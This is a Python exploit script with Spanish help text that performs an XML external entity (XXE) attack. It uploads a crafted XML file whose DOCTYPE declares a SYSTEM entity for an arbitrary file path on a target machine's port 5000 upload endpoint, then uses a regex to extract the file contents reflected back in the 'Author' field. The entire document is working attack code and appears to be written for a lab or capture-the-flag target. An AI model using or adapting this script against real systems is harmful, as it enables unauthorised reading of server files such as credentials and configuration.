#!/usr/bin/python3

import requests
import sys
import re
from argparse import ArgumentParser

def main(file_name,ip):
    xml = f'''<?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE foo [<!ENTITY example SYSTEM "{file_name}"> ]>
    <creds>
	    <Author>&example;</Author>
    	<Subject>contenido</Subject>
	    <Content>archivo xml</Content>
    </creds>'''

    files = {'file': ('cred.xml', xml, 'text/xml')}
    
    try:
        r = requests.post('http://{}:5000/upload'.format(ip), files=files)
        r.raise_for_status()  # Verifica que la conexión se ha realizado correctamente
        
        pattern = re.compile(r"Author:((?:.*\n)+)",flags=re.DOTALL)
        match = re.search(pattern, r.text)
        if match:
            print(match.group(1).strip())
        else:
            print("Author not found in the response.")
    
    except requests.exceptions.RequestException as req_err:
        print(f"[-] Request error occurred: {req_err}")
    except FileNotFoundError:
        print("[-] The specified file was not found.")
    except AttributeError as attr_err:
        print(f"[-] Attribute error occurred: {attr_err}")
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("-f", "--file_name", help="Archivo a leer de la maquina objetivo", required=True)
    parser.add_argument("-i", "--ip", help="IP de la maquina objetivo", required=True)
    args = parser.parse_args()
    
    main(args.file_name,args.ip)
